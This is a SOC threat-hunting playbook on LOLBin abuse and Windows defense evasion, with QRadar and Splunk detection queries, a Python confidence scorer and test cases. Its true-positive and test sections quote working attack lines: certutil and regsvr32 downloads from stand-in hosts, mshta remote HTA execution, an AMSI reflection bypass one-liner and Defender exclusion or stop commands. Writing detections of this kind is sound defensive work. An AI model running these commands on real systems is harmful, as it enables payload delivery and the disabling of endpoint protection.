# HUNT-005 — LOLBins & Defense Evasion
<!-- T1218 · T1059 · T1562 -->

---

## Überblick

| Feld              | Inhalt                                                                                                           |
|-------------------|------------------------------------------------------------------------------------------------------------------|
| Hunt-ID           | HUNT-005                                                                                                         |
| MITRE ATT&CK      | T1218 (Signed Binary Proxy Exec), T1059 (Command Interpreter), T1562 (Impair Defenses)                         |
| Taktik            | Defense Evasion, Execution                                                                                       |
| Daten-Quellen     | Sysmon (1, 3, 7, 12, 13), Windows Security (4688, 4689), PowerShell (4103, 4104), Windows Defender (1116, 5001) |
| Konfidenz-Basis   | Binary + argument patterns + parent process + network activity + defense tampering indicators                   |
| Autor             | SOC Engineering                                                                                                  |
| Letzte Revision   | 2026-06-03                                                                                                       |

---

## Erkennungslogik / Detection Logic

### 1. certutil — Decode / URL Cache / Encode

#### QRadar AQL
```aql
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "CommandLine",
    "Image",
    "ParentImage",
    "ParentCommandLine"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND LOWER("Image") LIKE '%certutil.exe'
    AND (
        LOWER("CommandLine") LIKE '%-decode%'
        OR LOWER("CommandLine") LIKE '%-decodehex%'
        OR LOWER("CommandLine") LIKE '%-urlcache%'
        OR LOWER("CommandLine") LIKE '%-ping%'
        OR LOWER("CommandLine") LIKE '%-f %http%'
        OR LOWER("CommandLine") LIKE '%-verifyctl%http%'
    )
    AND NOT (
        LOWER("ParentImage") LIKE '%\system32\services.exe'
        AND LOWER("CommandLine") LIKE '%-viewstore%'
    )
LAST 24 HOURS
```

#### Splunk SPL
```spl
index=sysmon EventCode=1 Image="*\\certutil.exe"
| eval lol_action=case(
    match(lower(CommandLine), "-urlcache.*-f.*http"), "DOWNLOAD",
    match(lower(CommandLine), "-decode "), "DECODE_FILE",
    match(lower(CommandLine), "-decodehex"), "DECODE_HEX",
    match(lower(CommandLine), "-ping"), "PING_CHECK",
    match(lower(CommandLine), "-verifyctl.*http"), "CERT_VERIFY_DL",
    1==1, "OTHER"
  )
| where lol_action != "OTHER"
| eval dest_file=replace(CommandLine, ".*(C:\\\\[^\s]+\.(exe|dll|ps1|vbs|bat|b64|txt))\s*.*", "\1")
| eval confidence=case(
    lol_action="DOWNLOAD" AND match(lower(dest_file), "\.(exe|dll)"), 95,
    lol_action="DOWNLOAD", 88,
    lol_action IN ("DECODE_FILE","DECODE_HEX"), 85,
    lol_action="PING_CHECK", 60,
    1==1, 70
  )
| table _time, Computer, user, CommandLine, lol_action, dest_file, confidence
| sort -confidence
```

---

### 2. mshta — Remote HTA Execution

#### QRadar AQL
```aql
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "CommandLine",
    "ParentImage",
    "ParentCommandLine"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND LOWER("Image") LIKE '%mshta.exe'
    AND (
        LOWER("CommandLine") LIKE '%http://%'
        OR LOWER("CommandLine") LIKE '%https://%'
        OR LOWER("CommandLine") LIKE '%\\\\%'                  -- UNC path
        OR LOWER("CommandLine") LIKE '%vbscript:%'
        OR LOWER("CommandLine") LIKE '%javascript:%'
        OR LOWER("CommandLine") LIKE '%about:%'
    )
    AND LOWER("ParentImage") NOT IN (
        'c:\windows\system32\svchost.exe',
        'c:\windows\system32\services.exe'
    )
LAST 24 HOURS
```

#### Splunk SPL
```spl
index=sysmon EventCode=1 Image="*\\mshta.exe"
| eval mshta_type=case(
    match(lower(CommandLine), "https?://"), "REMOTE_HTA",
    match(lower(CommandLine), "\\\\\\\\"), "UNC_HTA",
    match(lower(CommandLine), "(vbscript:|javascript:|about:)"), "INLINE_SCRIPT",
    1==1, "LOCAL"
  )
| where mshta_type != "LOCAL"
| eval parent=lower(ParentImage)
| eval risky_parent=if(match(parent, "(winword|excel|outlook|powerpnt|chrome|firefox|msedge|iexplore)\.exe"), 1, 0)
| eval confidence=case(
    mshta_type="REMOTE_HTA" AND risky_parent=1, 98,
    mshta_type="REMOTE_HTA", 92,
    mshta_type="UNC_HTA" AND risky_parent=1, 96,
    mshta_type="UNC_HTA", 88,
    mshta_type="INLINE_SCRIPT", 85,
    1==1, 65
  )
| table _time, Computer, user, CommandLine, mshta_type, ParentImage, confidence
| sort -confidence
```

---

### 3. regsvr32 — Squiblydoo (COM Scriptlet)

#### QRadar AQL
```aql
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "CommandLine",
    "ParentImage"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND LOWER("Image") LIKE '%regsvr32.exe'
    AND (
        LOWER("CommandLine") LIKE '%/s%/n%/u%/i:http%'
        OR LOWER("CommandLine") LIKE '%/s%/i:http%'
        OR LOWER("CommandLine") LIKE '%/s%/n%/i:\\\\%'   -- UNC scriptlet
        OR LOWER("CommandLine") LIKE '%.sct%'
        OR LOWER("CommandLine") LIKE '%.dll,%'            -- regsvr32 DLL comma entrypoint
    )
    AND LOWER("CommandLine") NOT LIKE '%\system32\%'      -- exclude standard DLL reg
    AND LOWER("CommandLine") NOT LIKE '%\syswow64\%'
LAST 24 HOURS
```

#### Splunk SPL
```spl
index=sysmon EventCode=1 Image="*\\regsvr32.exe"
| eval squiblydoo=case(
    match(lower(CommandLine), "/i:https?://"), "REMOTE_SCT",
    match(lower(CommandLine), "/i:\\\\\\\\"), "UNC_SCT",
    match(lower(CommandLine), "\\.sct"), "LOCAL_SCT",
    match(lower(CommandLine), "/s /n /u"), "UNREGISTER_PROXY",
    1==1, "NORMAL_REG"
  )
| where squiblydoo != "NORMAL_REG"
| eval network_conn=if(match(lower(CommandLine), "https?://[0-9]{1,3}\\.[0-9]{1,3}"), "RAW_IP", "DOMAIN")
| eval confidence=case(
    squiblydoo="REMOTE_SCT" AND network_conn="RAW_IP", 98,
    squiblydoo="REMOTE_SCT", 93,
    squiblydoo="UNC_SCT", 90,
    squiblydoo IN ("LOCAL_SCT","UNREGISTER_PROXY"), 80,
    1==1, 60
  )
| table _time, Computer, user, CommandLine, squiblydoo, ParentImage, confidence
| sort -confidence
```

---

### 4. rundll32 — Unusual DLL Invocation

#### Splunk SPL
```spl
index=sysmon EventCode=1 Image="*\\rundll32.exe"
| eval unusual_rundll=case(
    match(lower(CommandLine), "javascript:"), "JAVASCRIPT_EXEC",
    match(lower(CommandLine), "shell32\.dll,#44"), "INSTALLHINF_EXEC",
    match(lower(CommandLine), "pcwutl\.dll,launchapplication"), "PCWUTL",
    match(lower(CommandLine), "setupapi\.dll,installhinfsection"), "SETUPAPI",
    match(lower(CommandLine), "advpack\.dll,launchinfselectioninstallsvc"), "ADVPACK",
    match(lower(CommandLine), "ieadvpack\.dll"), "IEADVPACK",
    match(lower(CommandLine), "syssetup\.dll,setupinfsection"), "SYSSETUP",
    match(lower(CommandLine), "url\.dll,openurl.*http"), "URL_OPEN",
    NOT match(lower(CommandLine), "^[a-z]:\\\\windows\\\\(system32|syswow64)\\\\[a-z0-9_]+\.dll"), "UNKNOWN_DLL",
    1==1, "STANDARD"
  )
| where unusual_rundll != "STANDARD"
| eval confidence=case(
    unusual_rundll="JAVASCRIPT_EXEC", 96,
    unusual_rundll IN ("INSTALLHINF_EXEC","ADVPACK","IEADVPACK","SYSSETUP"), 88,
    unusual_rundll="UNKNOWN_DLL", 82,
    unusual_rundll="URL_OPEN" AND match(lower(CommandLine), "https?://[0-9]{1,3}\\.[0-9]{1,3}"), 90,
    unusual_rundll="URL_OPEN", 70,
    1==1, 65
  )
| table _time, Computer, user, CommandLine, unusual_rundll, ParentImage, confidence
| sort -confidence
```

---

### 5. wmic process call create

#### QRadar AQL
```aql
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "CommandLine",
    "ParentImage"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND LOWER("Image") LIKE '%wmic.exe'
    AND LOWER("CommandLine") LIKE '%process%call%create%'
    AND NOT (
        LOWER("ParentImage") LIKE '%\system32\svchost.exe'
        AND username LIKE 'SYSTEM%'
    )
LAST 24 HOURS
```

---

### 6. msiexec — Remote MSI Execution

#### Splunk SPL
```spl
index=sysmon EventCode=1 Image="*\\msiexec.exe"
| where match(lower(CommandLine), "/i\s+(https?://|\\\\\\\\)")
| eval source_type=if(match(lower(CommandLine), "https?://[0-9]{1,3}\\.[0-9]{1,3}"), "RAW_IP_URL",
    if(match(lower(CommandLine), "https?://"), "DOMAIN_URL", "UNC_PATH"))
| eval confidence=case(
    source_type="RAW_IP_URL", 95,
    source_type="DOMAIN_URL" AND NOT match(lower(CommandLine), "microsoft\.com|symantec\.com"), 85,
    source_type="UNC_PATH", 82,
    1==1, 60
  )
| table _time, Computer, user, CommandLine, source_type, ParentImage, confidence
```

---

### 7. AMSI Bypass — AmsiScanBuffer Patch Pattern

#### QRadar AQL (PowerShell 4104 Script Block Logging)
```aql
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "ScriptBlockText"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) = 'Microsoft Windows PowerShell'
    AND "Event ID" = '4104'
    AND (
        -- AMSI bypass patterns
        LOWER("ScriptBlockText") LIKE '%amsi.dll%'
        OR LOWER("ScriptBlockText") LIKE '%amsiscanbuffer%'
        OR LOWER("ScriptBlockText") LIKE '%amsiutils%'
        OR LOWER("ScriptBlockText") LIKE '%[ref].assembly.gettype%utils%'
        OR "ScriptBlockText" LIKE '%0xb8, 0x57, 0x00%'       -- ret 0x57 AMSI bypass bytes
        OR "ScriptBlockText" LIKE '%0x80070057%'
        OR LOWER("ScriptBlockText") LIKE '%setfield%nonpublic%amsi%'
        OR LOWER("ScriptBlockText") LIKE '%[system.runtime.interopservices.marshal]%'
        -- ETW patching
        OR LOWER("ScriptBlockText") LIKE '%ntdll%etweventwrite%'
        OR LOWER("ScriptBlockText") LIKE '%patchetw%'
        -- CLM bypass
        OR LOWER("ScriptBlockText") LIKE '%__psscriptpolicytest%'
        OR LOWER("ScriptBlockText") LIKE '%setlanguagemode%'
    )
LAST 24 HOURS
```

#### Splunk SPL
```spl
index=powershell EventCode=4104
| eval amsi_bypass=case(
    match(lower(ScriptBlockText), "(amsi\.dll|amsiscanbuffer|amsiutils|amsicontext)"), "AMSI_REFERENCE",
    match(ScriptBlockText, "(0xb8, 0x57, 0x00|0x80070057|75, 0x00, 0x07)"), "AMSI_PATCH_BYTES",
    match(lower(ScriptBlockText), "\\[ref\\]\\.assembly\\.gettype.*utils.*getfield.*nonpublic"), "AMSI_REFLECTION",
    match(lower(ScriptBlockText), "(ntdll.*etweventwrite|patchetw|etw.*patch)"), "ETW_BYPASS",
    match(lower(ScriptBlockText), "(__psscriptpolicytest|setlanguagemode|fullLanguage)"), "CLM_BYPASS",
    match(lower(ScriptBlockText), "setfield.*nonpublic.*amsi"), "AMSI_FIELD_NULL",
    1==1, null()
  )
| where isnotnull(amsi_bypass)
| eval confidence=case(
    amsi_bypass="AMSI_PATCH_BYTES", 99,
    amsi_bypass="AMSI_REFLECTION", 97,
    amsi_bypass="AMSI_FIELD_NULL", 97,
    amsi_bypass="ETW_BYPASS", 95,
    amsi_bypass="CLM_BYPASS", 85,
    amsi_bypass="AMSI_REFERENCE", 75,
    1==1, 65
  )
| table _time, Computer, user, amsi_bypass, ScriptBlockText, confidence
| sort -confidence
```

---

### 8. Defender Exclusion Addition — Registry + cmdline

#### QRadar AQL
```aql
-- Defender exclusion via registry (Sysmon 13) or PowerShell cmdlet
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "Event ID",
    "TargetObject" AS reg_key,
    "Details" AS reg_value,
    "Image" AS proc_image,
    "CommandLine"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '13'
    AND "TargetObject" LIKE '%\Windows Defender\Exclusions\%'
    AND username NOT IN ('SYSTEM', 'TrustedInstaller')
    AND "Image" NOT LIKE '%MsMpEng.exe'
    AND "Image" NOT LIKE '%ConfigSecurityPolicy.exe'
LAST 24 HOURS

UNION

SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "Event ID",
    '' AS reg_key,
    '' AS reg_value,
    "Image" AS proc_image,
    "CommandLine"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND (
        LOWER("CommandLine") LIKE '%add-mppreference%-exclusion%'
        OR LOWER("CommandLine") LIKE '%set-mppreference%-disablerealtimemonitoring%'
        OR LOWER("CommandLine") LIKE '%set-mppreference%-disableioavprotection%'
        OR LOWER("CommandLine") LIKE '%sc stop windefend%'
        OR LOWER("CommandLine") LIKE '%net stop windefend%'
    )
LAST 24 HOURS
```

#### Splunk SPL
```spl
(index=sysmon EventCode=13 TargetObject="*\\Windows Defender\\Exclusions\\*"
    NOT (user IN ("SYSTEM","NT AUTHORITY\\SYSTEM") AND (Image="*MsMpEng.exe" OR Image="*ConfigSecurityPolicy.exe"))
) OR (
index=sysmon EventCode=1
| where match(lower(CommandLine), "(add-mppreference.*(exclusionpath|exclusionprocess|exclusionextension)|set-mppreference.*(disablerealtimemonitoring|disableioavprotection|disablebehaviormonitoring|disableantispyware)=\s*\$true|sc\s+stop\s+windefend|net\s+stop\s+windefend)"))
| eval evasion_type=case(
    EventCode=13, "REGISTRY_EXCLUSION",
    match(lower(CommandLine), "exclusionpath"), "PATH_EXCLUSION",
    match(lower(CommandLine), "exclusionprocess"), "PROCESS_EXCLUSION",
    match(lower(CommandLine), "disablerealtimemonitoring"), "DISABLE_REALTIME",
    match(lower(CommandLine), "(stop windefend|stop.*defender)"), "STOP_SERVICE",
    1==1, "OTHER_EVASION"
  )
| eval confidence=case(
    evasion_type="STOP_SERVICE", 97,
    evasion_type="DISABLE_REALTIME", 96,
    evasion_type="REGISTRY_EXCLUSION" AND NOT match(user, "SYSTEM|TrustedInstaller"), 90,
    evasion_type IN ("PATH_EXCLUSION","PROCESS_EXCLUSION"), 85,
    1==1, 70
  )
| table _time, Computer, user, evasion_type, CommandLine, TargetObject, confidence
| sort -confidence
```

---

## True Positives (Echte Angriffsindikatoren)

### TP-001 — certutil Download + Decode Chain
- **Indikatoren:** `certutil.exe -urlcache -split -f http://185.220.101.47/stage2.b64 C:\ProgramData\stage2.b64` followed by `certutil.exe -decode C:\ProgramData\stage2.b64 C:\ProgramData\svchost32.exe`; Sysmon 3 outbound to raw IP; child process executes decoded binary
- **Confidence:** 97
- **MITRE:** T1218.004, T1105

### TP-002 — Squiblydoo Remote SCT via IP
- **Indikatoren:** `regsvr32.exe /s /n /u /i:http://192.168.241.100:8080/payload.sct scrobj.dll`; Sysmon 3: `regsvr32.exe` outbound TCP to C2; subsequent `cmd.exe` spawned via COM
- **Confidence:** 99
- **MITRE:** T1218.010

### TP-003 — mshta Remote HTA from Outlook
- **Indikatoren:** Sysmon 1: `OUTLOOK.EXE` → `mshta.exe http://attacker.xyz/stage.hta`; HTA downloads second stage via `XMLHttpRequest`
- **Confidence:** 99
- **MITRE:** T1218.005, T1566.001

### TP-004 — AMSI Bypass (Reflection) + AMSI field null
- **Indikatoren:** PS 4104: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`; subsequent execution of offensive PowerShell without 4104 ScriptBlock events (AMSI disabled)
- **Confidence:** 99
- **MITRE:** T1562.001

### TP-005 — Defender Exclusion Before Ransomware Drop
- **Indikatoren:** `Add-MpPreference -ExclusionPath C:\ProgramData` → 5 minutes later: mass file encryption starting in `C:\ProgramData\`; user is unprivileged (not admin — UAC bypass used prior)
- **Confidence:** 98
- **MITRE:** T1562.001, T1486

---

## False Positives (Bekannte FP-Quellen)

| FP-ID  | Quelle                     | Erkennungsmerkmal                                                    | Whitelist-Logik                                                                          |
|--------|----------------------------|----------------------------------------------------------------------|------------------------------------------------------------------------------------------|
| FP-001 | PKI Admins                 | certutil -viewstore, -addstore (certificate management)              | User in `PKI_Admins` group AND args don't include urlcache/decode                       |
| FP-002 | Software Deployments       | msiexec /i https://download.vendor.com/ (HTTPS from known vendor)   | URL matches approved software CDN list AND file hash in known-good baseline              |
| FP-003 | Endpoint Management (MDM)  | Defender exclusions set by management tools (SCCM/Intune)            | Process is `ConfigSecurityPolicy.exe` OR `MsMpEng.exe` OR user is SYSTEM               |
| FP-004 | Legitimate rundll32 use    | Standard DLL registration during software install                    | DLL path in `%SystemRoot%\System32` or `%ProgramFiles%` AND signed                     |
| FP-005 | Enterprise CTI Tooling     | wmic process call create for automation in management context        | Source in `monitoring_servers` AND parent is known automation framework                  |
| FP-006 | AV Exclusions via GPO      | Defender exclusions deployed via Group Policy                        | Correlate with GPO change event on DC within same change window                         |

---

## Varianten / Evasion-Techniken

### VAR-001 — certutil Renamed Binary
- Copy `certutil.exe` to `cert32.exe` and execute — same functionality, binary name bypass
- **Detection:** Sysmon 7 (ImageLoad): `crypt32.dll` loaded by unexpected process; PE OriginalFilename = `CertUtil.exe` (Sysmon 1 `OriginalFileName` field)

### VAR-002 — regsvr32 with HTTPS + DLL (not .sct)
- Register a malicious DLL directly via HTTPS: `regsvr32 /s /i:https://c2/payload.dll`
- **Detection:** Same Sysmon 3 network connection from `regsvr32.exe` to external; DLL load (Sysmon 7) of non-standard DLL

### VAR-003 — PowerShell Constrained Language Mode Bypass
- Exploit via COM object in Constrained Language Mode: `$com = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'...'))` — runs in FullLanguage via COM
- **Detection:** PS 4104 with COM CLSID activation patterns; subsequent events in FullLanguage; `__PSScriptPolicyTest` artifact

### VAR-004 — ETW Provider Patching (in-memory)
- Patch `ntdll!EtwEventWrite` with `ret` opcode to blind ETW consumers including Windows Defender
- **Detection:** PS 4104 with ETW/ntdll memory write patterns; absence of expected 4103/4104 events after suspicious PS execution; WD event log gaps

### VAR-005 — AMSI via COM (bypassing .NET reflection detection)
- Use `VirtualProtect` + `WriteProcessMemory` via P/Invoke to patch AMSI without .NET reflection
- **Detection:** PS 4104 with `VirtualProtect`, `WriteProcessMemory`, `kernel32`, `GetProcAddress` patterns

### VAR-006 — Indirect Syscalls / Hell's Gate
- Bypass user-mode hooks by calling syscalls directly, evading EDR hooks on ntdll
- **Detection:** Behavioral: unexpected privilege operations without corresponding ntdll calls; parent-child process anomalies; network connections without expected API call telemetry

### VAR-007 — Living off the Land: forfiles / pcalua
- `forfiles /c "cmd /c ..."` or `pcalua.exe -a calc.exe` for stealthy execution
- **Detection:** Sysmon 1: `forfiles.exe` or `pcalua.exe` spawning unexpected children; parent-child lineage anomaly

---

## Confidence Scoring

```python
from dataclasses import dataclass, field
from typing import List, Optional
import re

LOLBIN_SIGNATURES = {
    "certutil.exe": {
        "download": ["-urlcache", "-f http", "-f https"],
        "decode": ["-decode ", "-decodehex "],
        "c2_check": ["-ping "],
    },
    "mshta.exe": {
        "remote": ["http://", "https://", "\\\\"],
        "inline": ["vbscript:", "javascript:", "about:"],
    },
    "regsvr32.exe": {
        "scriptlet": ["/i:http", "/i:https", ".sct", "/s /n /u /i:"],
    },
    "rundll32.exe": {
        "suspicious": ["javascript:", "shell32.dll,#44", "pcwutl.dll", "advpack.dll", "ieadvpack.dll"],
    },
    "msiexec.exe": {
        "remote": ["/i http", "/i https", "/i \\\\"],
    },
    "wmic.exe": {
        "exec": ["process call create"],
    },
}

AMSI_BYPASS_PATTERNS = [
    re.compile(r"amsi\.dll", re.IGNORECASE),
    re.compile(r"amsiscanbuffer", re.IGNORECASE),
    re.compile(r"0xb8,\s*0x57,\s*0x00", re.IGNORECASE),
    re.compile(r"\[ref\]\.assembly\.gettype.*utils.*getfield.*nonpublic", re.IGNORECASE | re.DOTALL),
    re.compile(r"setfield.*nonpublic.*amsi", re.IGNORECASE),
    re.compile(r"0x80070057", re.IGNORECASE),
    re.compile(r"virtualprotect.*amsiscan", re.IGNORECASE | re.DOTALL),
]

ETW_BYPASS_PATTERNS = [
    re.compile(r"ntdll.*etweventwrite", re.IGNORECASE),
    re.compile(r"patchetw", re.IGNORECASE),
    re.compile(r"etweventwrite.*\x00\xC3", re.IGNORECASE),  # ret opcode
]

DEFENDER_EVASION = [
    re.compile(r"add-mppreference.*exclusion(path|process|extension)", re.IGNORECASE),
    re.compile(r"set-mppreference.*(disablerealtimemonitoring|disableioavprotection|disablebehaviormonitoring)\s*=\s*\$true", re.IGNORECASE),
    re.compile(r"sc\s+stop\s+windefend", re.IGNORECASE),
    re.compile(r"net\s+stop\s+(windefend|mpssvc|wscsvc)", re.IGNORECASE),
]

@dataclass
class LOLBinEvent:
    host: str
    username: str
    image: str                  # full path
    commandline: str
    parent_image: str
    script_block: str = ""      # for PowerShell 4104
    has_network_connection: bool = False
    dest_ip: str = ""
    dest_port: int = 0
    is_approved_context: bool = False
    is_signed: bool = True
    original_filename: str = ""  # Sysmon OriginalFileName

def _binary_name(image: str) -> str:
    return image.lower().split("\\")[-1] if image else ""

def score_lolbin(evt: LOLBinEvent) -> dict:
    if evt.is_approved_context:
        return {"confidence": 5, "verdict": "WHITELISTED", "reasons": ["Approved context"], "techniques": []}

    score = 0
    reasons = []
    techniques = []
    binary = _binary_name(evt.image)
    cmdline_lower = evt.commandline.lower()

    # --- LOLBin binary matching ---
    if binary in LOLBIN_SIGNATURES:
        score += 15
        reasons.append(f"Known LOLBin: {binary}")
        sigs = LOLBIN_SIGNATURES[binary]
        for action, patterns in sigs.items():
            if any(p.lower() in cmdline_lower for p in patterns):
                score += 35
                reasons.append(f"{binary} {action} action detected")
                if binary == "certutil.exe":
                    techniques.append("T1218.004")
                elif binary == "mshta.exe":
                    techniques.append("T1218.005")
                elif binary == "regsvr32.exe":
                    techniques.append("T1218.010")
                elif binary == "rundll32.exe":
                    techniques.append("T1218.011")
                elif binary == "msiexec.exe":
                    techniques.append("T1218.007")
                elif binary == "wmic.exe":
                    techniques.append("T1047")
                break

    # --- Renamed binary detection ---
    if evt.original_filename and binary != _binary_name(evt.original_filename):
        score += 30
        reasons.append(f"Binary renamed: original={evt.original_filename}, current={binary}")
        techniques.append("T1036.003")

    # --- Network connection from LOLBin ---
    if evt.has_network_connection:
        score += 25
        reasons.append(f"Network connection: {evt.dest_ip}:{evt.dest_port}")
        if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", evt.dest_ip):
            score += 15
            reasons.append("Connection to raw IP (no domain)")

    # --- Parent process risk ---
    risky_parents = {"winword.exe", "excel.exe", "outlook.exe", "powerpnt.exe",
                     "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe"}
    if _binary_name(evt.parent_image) in risky_parents:
        score += 30
        reasons.append(f"Risky parent process: {evt.parent_image}")

    # --- AMSI bypass in script block ---
    amsi_matched = [p.pattern for p in AMSI_BYPASS_PATTERNS if p.search(evt.script_block)]
    if amsi_matched:
        score += 55
        reasons.extend([f"AMSI bypass pattern: {p}" for p in amsi_matched[:2]])
        techniques.append("T1562.001")

    # --- ETW bypass ---
    etw_matched = [p.pattern for p in ETW_BYPASS_PATTERNS if p.search(evt.script_block)]
    if etw_matched:
        score += 55
        reasons.append("ETW patching pattern detected")
        techniques.append("T1562.006")

    # --- Defender evasion ---
    defender_matched = [p.pattern for p in DEFENDER_EVASION if p.search(evt.commandline)]
    if defender_matched:
        score += 50
        reasons.extend([f"Defender evasion: {p}" for p in defender_matched[:2]])
        techniques.append("T1562.001")

    confidence = min(100, score)
    verdict = (
        "HIGH" if confidence >= 80
        else "MEDIUM" if confidence >= 55
        else "LOW" if confidence >= 30
        else "INFORMATIONAL"
    )

    return {
        "confidence": confidence,
        "verdict": verdict,
        "reasons": reasons,
        "techniques": list(set(techniques))
    }
```

---

## Testfälle / Test Cases

| TC-ID  | Typ           | Beschreibung                                                                         | Expected Confidence | Expected Verdict |
|--------|---------------|--------------------------------------------------------------------------------------|---------------------|------------------|
| TC-001 | True Positive | certutil -urlcache -f http://[RAW_IP]/payload.exe                                   | 90–100              | HIGH             |
| TC-002 | True Positive | regsvr32 /s /n /u /i:https://attacker.xyz/payload.sct scrobj.dll                   | 90–100              | HIGH             |
| TC-003 | True Positive | mshta.exe http://c2/ from OUTLOOK.EXE parent                                        | 95–100              | HIGH             |
| TC-004 | True Positive | PowerShell 4104 with AMSI reflection bypass (GetField + SetValue $null)              | 95–100              | HIGH             |
| TC-005 | True Positive | Add-MpPreference -ExclusionPath C:\ProgramData (non-admin, non-SYSTEM)              | 85–95               | HIGH             |
| TC-006 | True Positive | Renamed certutil.exe → cert32.exe with -urlcache                                    | 90–100              | HIGH             |
| TC-007 | False Positive | certutil -viewstore (PKI admin certificate management)                              | ≤20                 | INFORMATIONAL    |
| TC-008 | False Positive | msiexec /i https://download.software.com/ (signed, approved vendor)                | ≤20                 | INFORMATIONAL    |
| TC-009 | False Positive | Defender exclusion set by SCCM ConfigSecurityPolicy.exe as SYSTEM                  | ≤10                 | WHITELISTED      |
| TC-010 | Edge Case     | wmic process call create from monitoring server (SolarWinds automation)              | 30–50               | LOW/MEDIUM       |
